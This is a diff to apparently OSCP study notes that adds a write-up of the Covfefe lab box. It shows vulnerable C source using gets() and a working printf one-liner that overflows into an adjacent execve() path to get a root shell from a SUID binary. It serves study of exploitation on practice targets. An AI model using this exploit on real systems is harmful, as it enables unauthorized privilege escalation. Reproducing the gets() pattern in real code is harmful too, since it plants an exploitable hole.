@@ -119,6 +119,31 @@ Seen in [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
 
 #### Tags: #CloudMe #StackOverflow #PUSHESP #CrashAsSignal #PayloadDelivery #CommandBreakdowns
 
+## Covfefe: when the overwrite changes data consumed by `execve()`
+
+Covfefe is a useful reminder that “buffer overflow” does not automatically mean “overwrite EIP and land shellcode.” The source declares a 20-byte `buf` and a nearby `program` array. On the target's 32-bit build, the arrays are adjacent in the stack frame, so input beyond `buf` changes the command path rather than the saved return address.
+
+```c
+char program[] = "/usr/local/sbin/message";
+char buf[20];
+gets(buf);
+if (!strncmp(authorized, buf, 5)) {
+    execve(program, NULL, NULL);
+}
+```
+
+The exploit preserves the five-byte `Simon` comparison, consumes the remaining fifteen bytes of `buf`, and writes `/bin/sh` into the adjacent string. The explicit NUL matters because `execve()` receives a C string. The helper already has the SUID bit, so `/bin/sh` inherits effective UID 0 and `id` is the correct success check.
+
+```bash
+checksec --file=$SuidPath
+(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) | $SuidPath
+id
+```
+
+The reasoning sequence is: source review, calculate the field boundary, preserve the validation prefix, overwrite only the path, keep stdin open for an interactive shell, and distinguish real UID from effective UID. No shellcode, ROP gadget, or saved-return-address offset is part of this exploit.
+
+#### Tags: #Covfefe #SUID #AdjacentStringOverwrite #Gets #Execve #EffectiveUID #CommandBreakdowns
+
 ## **Outstanding**
 - [ ] A genuine from-scratch offset/bad-char/return-address discovery workflow (Immunity Debugger + `mona.py`, Metasploit's `pattern_create`/`pattern_offset`), once a box requires deriving these rather than reusing a public exploit's own already-researched values. See [[14. Fixing Exploits#14.3. Wrapping Up|14.3]]'s HackTricks link for where to start.
 ## External Resources
@@ -139,3 +164,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- demonstrates a source-derived SUID adjacent-string overwrite
